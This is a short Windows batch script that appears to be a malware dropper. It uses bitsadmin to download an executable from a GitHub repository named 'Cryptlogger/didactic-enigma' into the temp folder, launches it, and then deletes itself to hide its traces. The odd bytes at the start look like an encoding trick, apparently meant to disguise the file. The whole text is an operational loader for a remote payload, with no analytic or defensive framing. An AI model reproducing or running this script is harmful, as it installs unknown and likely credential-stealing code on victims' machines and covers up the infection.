��&cls
��

set pOut="%temp%\\out.exe"
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/Cryptlogger/didactic-enigma/raw/main/installer.exe" %pOut%
start "" %pOut%
DEL "%~f0"
                